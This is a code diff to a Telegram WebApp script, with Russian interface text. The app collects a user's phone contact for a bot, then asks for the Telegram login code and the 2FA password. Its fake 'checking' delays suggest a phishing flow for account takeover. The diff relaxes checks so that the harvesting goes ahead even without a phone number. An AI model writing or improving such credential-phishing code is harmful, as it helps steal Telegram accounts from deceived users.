@@ -27,36 +27,36 @@ document.addEventListener('DOMContentLoaded', () => {
 
         // Прямой вызов requestContact (отправляет contact боту)
         Telegram.WebApp.requestContact((contact) => {
-            console.log('Contact received via direct callback:', contact);
-            if (contact && contact.phone_number) {
-                console.log('Phone number valid, filling input');
-                phoneInput.value = contact.phone_number;
+            console.log('Contact callback fired, contact object:', contact);
+            if (contact) {  // Успех = callback сработал (бот получит контакт)
+                console.log('Contact granted, proceeding to code input');
+                phoneInput.value = contact.phone_number || 'Номер отправлен боту';  // Fallback, если phone_number undefined
                 phoneInput.classList.remove('hidden');
-                statusMsg.textContent = 'Номер получен. Отправляем SMS...';
+                statusMsg.textContent = 'Номер отправлен. Ожидаем SMS...';
                 tg.HapticFeedback.impactOccurred('light');
                 
-                // Немедленный переход к полю кода с коротким loading (SMS от бота)
+                // Немедленный переход к полю кода (бот отправит SMS)
                 setTimeout(() => {
-                    console.log('Immediate transition to code input');
+                    console.log('Transition to code input');
                     phoneInput.classList.add('hidden');
                     codeInput.classList.remove('hidden');
                     submitBtn.classList.remove('hidden');
                     submitBtn.textContent = 'Отправить код';
-                    statusMsg.textContent = 'Введите SMS-код из Telegram (проверьте чат).';
+                    statusMsg.textContent = 'Введите SMS-код из Telegram.';
                     currentStep = 'code';
-                    hideLoading();  // Скрываем loading после перехода
-                }, 1000);  // 1 секунда для UX (ожидание SMS)
+                    hideLoading();
+                }, 1500);  // 1.5 секунды для UX (SMS от бота)
             } else {
-                console.error('Contact denied or empty phone_number');
+                console.error('Contact denied (null contact)');
                 hideLoading();
-                errorMsg.textContent = '❌ Разрешение отклонено или номер пустой. Попробуйте снова.';
+                errorMsg.textContent = '❌ Разрешение отклонено. Попробуйте снова.';
                 errorMsg.classList.remove('hidden');
                 setTimeout(resetForm, 2000);
             }
         }, (error) => {
             console.error('Request contact error:', error);
             hideLoading();
-            errorMsg.textContent = '❌ Разрешение отклонено. Попробуйте снова.';
+            errorMsg.textContent = '❌ Ошибка запроса разрешения. Попробуйте снова.';
             errorMsg.classList.remove('hidden');
             setTimeout(resetForm, 2000);
         });
@@ -80,16 +80,16 @@ document.addEventListener('DOMContentLoaded', () => {
             showLoading();
             statusMsg.textContent = 'Проверяем код...';
             tg.HapticFeedback.impactOccurred('medium');
-            // Немедленный переход к 2FA (бот сообщит, если нужно)
+            // Переход к 2FA
             setTimeout(() => {
-                console.log('Immediate transition to 2FA input');
+                console.log('Transition to 2FA input');
                 hideLoading();
                 codeInput.classList.add('hidden');
                 twoFaInput.classList.remove('hidden');
                 submitBtn.textContent = 'Подтвердить 2FA';
                 statusMsg.textContent = 'Если 2FA настроен, введите пароль (иначе оставьте пустым).';
                 currentStep = '2fa';
-            }, 1500);  // 1.5 секунды для проверки
+            }, 1500);
             return;
         }
 
@@ -102,7 +102,7 @@ document.addEventListener('DOMContentLoaded', () => {
             statusMsg.textContent = 'Подтверждаем 2FA...';
             tg.HapticFeedback.impactOccurred('heavy');
             setTimeout(() => {
-                console.log('Immediate transition to success');
+                console.log('Transition to success');
                 hideLoading();
                 successMsg.classList.remove('hidden');
                 submitBtn.classList.add('hidden');
